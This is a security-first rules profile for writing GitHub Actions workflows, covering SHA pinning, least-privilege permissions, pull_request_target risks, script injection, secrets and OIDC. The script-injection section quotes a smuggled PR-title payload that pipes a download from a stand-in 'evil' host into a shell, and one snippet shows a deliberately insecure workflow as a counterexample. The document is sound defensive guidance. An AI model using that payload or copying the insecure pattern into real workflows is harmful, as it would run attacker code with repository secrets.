# GitHub Actions Coder Profile

GitHub Actions-specific coding rules. Applied on top of the default coder profile.
Security-first: CI workflows are a top supply-chain attack surface — a compromised
action or an injected expression runs with repository credentials.

## Pin Third-Party Actions to a Full Commit SHA

Reference every third-party action by a **full 40-character commit SHA**, never a tag
or branch. Tags and branches are mutable — an attacker who pushes a malicious commit
and re-points a tag executes in your pipeline with your `GITHUB_TOKEN` and secrets.

```yaml
# Good — pinned to an immutable commit, version in a trailing comment
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

# Bad — mutable tag
- uses: actions/checkout@v4

# Bad — mutable branch (worst case)
- uses: some-org/some-action@main
```

- First-party `actions/*` and `github/*` may use a SHA too; for sensitive repos, pin
  everything including first-party.
- Keep the human-readable version in a trailing comment so Dependabot/Renovate can
  bump it (both update SHA pins and the comment).
- Docker-based `uses:` should pin by digest (`image@sha256:...`), not by tag.

### `persist-credentials: false` on checkout

`actions/checkout` writes the `GITHUB_TOKEN` into `.git/config` by default. Any later step
or third-party action can then read it, and workflows that upload the checkout as an
artifact leak the token. Set `persist-credentials: false` on every checkout that does not
need to push back to the repo.

```yaml
- uses: actions/checkout@<sha>
  with:
    persist-credentials: false   # default true leaves the token in .git/config
```

## Publish Immutable Actions and Releases

The complement to SHA-pinning on the consumer side is publishing immutability on the
producer side, so a downstream pin cannot be silently changed.

- Publish actions to the GitHub Marketplace as **immutable releases** — once published, a
  version's tag cannot be repointed to different code.
- Treat your own release tags as immutable; never force-push or move a published tag.
- Pin Docker base images used by your action by digest, same as any `uses:`.

## Least-Privilege `permissions:`

Set an explicit `permissions:` block. The default `GITHUB_TOKEN` is broad; restrict it
to the minimum. Declare `contents: read` at the **workflow** level as the baseline, then
grant additional scopes per **job** only where needed.

```yaml
# Top of workflow — restrictive default for every job
permissions:
  contents: read

jobs:
  release:
    permissions:
      contents: write      # create a release/tag
      id-token: write      # OIDC for cloud auth
    runs-on: ubuntu-24.04
```

- Never use `permissions: write-all` or omit the block on workflows that handle
  untrusted input.
- Grant write scopes (`contents`, `packages`, `pull-requests`, `id-token`) at the job
  level, not the workflow level.
- A job that only builds and tests needs `contents: read` and nothing else.

## Never Combine `pull_request_target` with Untrusted Checkout + Secrets

`pull_request_target` runs in the context of the **base** repository — it has access to
secrets and a read/write `GITHUB_TOKEN`, even for PRs from forks. Checking out the PR
head and running its code under this trigger hands repository credentials to any forker.

```yaml
# DANGEROUS — do not do this
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # untrusted code
      - run: npm install && npm run build                  # runs with secrets
```

- Use plain `pull_request` for anything that builds, installs deps, or runs PR code —
  it runs without secrets and with a read-only token for forks.
- Reserve `pull_request_target` for trusted metadata-only work (labeling, comments) and
  **do not** check out or execute the PR head there.
- If you must process fork code with privileged follow-up, split it: build artifacts in
  an untrusted `pull_request` workflow, then consume them in a separate
  `workflow_run` job that never executes fork code.

## Treat Artifacts from Untrusted Workflows as Attacker-Controlled

Artifacts produced by a fork's `pull_request` build (and consumed in a privileged
`workflow_run`) are **attacker-controlled data**, not trusted output. A poisoned artifact
can carry malicious file contents or path-traversal entries (`../../`) that escape the
download directory and overwrite files in the privileged job.

- Never execute, source, or `eval` anything extracted from an untrusted artifact.
- Validate names/paths before use; download into a dedicated scratch dir and confirm
  extracted paths stay inside it (recent `download-artifact` versions check this — keep it
  pinned current).
- Do not feed artifact contents into `run:` expressions (same script-injection rule as
  event data below).

## No Untrusted Input Interpolated into `run:` (Script Injection)

Never expand `${{ ... }}` containing attacker-controllable values directly inside a
`run:` script. The expression is substituted as raw text **before** the shell runs, so a
crafted branch name, PR title, or issue body can break out and execute arbitrary commands.

Untrusted fields include `github.event.issue.title`, `github.event.pull_request.*`,
`github.event.comment.body`, `github.head_ref`, `github.event.*.body`, and any
`inputs.*` from `workflow_dispatch`/`workflow_call`.

```yaml
# Bad — script injection: a PR title of `"; curl evil | sh; #` executes
- run: echo "Building ${{ github.event.pull_request.title }}"

# Good — pass through an env var; the shell sees it as data, not code
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Building $PR_TITLE"
```

- Bind untrusted values to `env:` and reference them as quoted shell variables.
- This applies to `actions/github-script` too — read untrusted values from
  `process.env`, never template them into the script body.

## Secrets Handling

- Reference secrets via `${{ secrets.NAME }}`; never hardcode tokens, keys, or
  passwords in workflow YAML.
- Never `echo`, `cat`, or `print` a secret — even masked, it can leak through
  multi-line output, base64, or error traces. Pass secrets through `env:` into the tool
  that needs them.
- Pass secrets to reusable workflows explicitly with `secrets:` (or `secrets: inherit`
  only when the callee is fully trusted), not by reconstructing them.
- Scope secrets to environments (`environment:`) with required reviewers for
  production deploys.

## OIDC for Cloud Auth — No Long-Lived Keys

Authenticate to cloud providers with **OIDC federation** instead of storing static
access keys as secrets. The workflow exchanges a short-lived signed token for temporary
credentials.

```yaml
permissions:
  id-token: write   # required to request the OIDC token
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@<sha>
    with:
      role-to-assume: arn:aws:iam::123456789012:role/ci-deploy
      aws-region: us-east-1
```

- Scope the cloud-side trust policy to the specific repo, branch, and/or environment
  (`sub` claim) — never trust the whole org.
- Applies to AWS, GCP (Workload Identity Federation), and Azure equally.

## `concurrency` to Cancel Stale Runs

Group runs per ref and cancel superseded ones to save runners and avoid racing deploys.

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

- Use `cancel-in-progress: true` for CI on PRs/branches.
- Use `cancel-in-progress: false` for deploy/release workflows where cancelling
  mid-run leaves a partial state.

## Pin Runner Versions

Use an explicit runner image (`ubuntu-24.04`, not `ubuntu-latest`). `latest` shifts
under you when GitHub rolls the image forward, causing surprise breakage.

```yaml
runs-on: ubuntu-24.04   # not ubuntu-latest
```

## Job Timeouts

Set `timeout-minutes` on every job. The default is 360 minutes (6 hours) — a hung job
burns runner minutes and blocks `concurrency` groups.

```yaml
jobs:
  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
```

## Caching with Correct Keys

Cache dependencies with a key that includes a hash of the lockfile, plus a `restore-keys`
fallback for partial reuse.

```yaml
- uses: actions/cache@<sha>
  with:
    path: ~/.npm
    key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      ${{ runner.os }}-npm-
```

- Include `runner.os` (and arch/version where relevant) in the key.
- Never cache secrets or credentials.
- Prefer the language setup action's built-in cache (`actions/setup-node` `cache:`,
  `actions/setup-python` `cache:`) when available — it keys correctly by default.

## Reusable Workflows

Factor shared CI logic into reusable workflows (`on: workflow_call`) instead of copy-
pasting jobs across repos. Declare typed `inputs:` and explicit `secrets:`.

```yaml
# .github/workflows/build.yml
on:
  workflow_call:
    inputs:
      node-version:
        type: string
        required: true
    secrets:
      NPM_TOKEN:
        required: true
```

Pin called reusable workflows from other repos by SHA (`org/repo/.github/workflows/
build.yml@<sha>`), same as actions.

## Matrix and Hygiene

- Keep matrices minimal — every cell is a full job; `exclude:` impossible combinations. Use `fail-fast: true` for PR feedback.
- Scope triggers with `paths:`/`branches:` filters so workflows run only when relevant.
- Avoid `continue-on-error: true` except on genuinely optional steps — it hides failures.
- Keep the third-party action count low; each is a trust dependency.
